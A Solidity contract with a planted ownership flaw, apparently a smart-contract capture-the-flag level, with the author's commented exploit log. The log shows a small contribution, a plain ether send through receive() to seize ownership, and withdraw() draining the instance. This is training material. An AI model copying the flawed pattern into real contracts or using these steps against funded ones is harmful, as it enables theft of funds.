// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);

    contributions[msg.sender] += msg.value;

    // Problem here is that if someone donates a large eth value, they become the owner.
    // Avoid this but would take 10000s of transactions to do so.
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }

  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  // This is the exploit we can use to become the contract owner with ease.
  // We can match both requirements with ease after sending a small amount of ETH and following up with an additional transaction that will not be via the receive() function
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

// Contract instance: 0x49A346044244576A714C4cEc29474cE60bB2A6Ec

// web3.eth.getBalance("0x49A346044244576A714C4cEc29474cE60bB2A6Ec")
// Current ETH balance: 0

// Contract owner is the address shown
// await contract.owner() => '0x46f79002907a025599f355A04A512A6Fd45E671B'

// player (me) not contract owner
// player => '0x319d567611c5a1017BA081e2B27B7c7b57e1797d'

// Contribute to the contract
// contract.contribute({value: toWei("0.0001")})

// Check contract balance
// web3.eth.getBalance("0x49A346044244576A714C4cEc29474cE60bB2A6Ec") => "100000000000000"

// contract.sendTransaction({value: toWei("0.001")})

// Check contract balance
// web3.eth.getBalance("0x49A346044244576A714C4cEc29474cE60bB2A6Ec") => "1100000000000000"

// await contract.owner() => '0x319d567611c5a1017BA081e2B27B7c7b57e1797d'

// contract.withdraw() => tx: "0x83a75b99223ab7551be72673ff9ef65bf67ae1f896fe0cec3a577662983c5dea"

// await getBalance(contract.address) => "0"    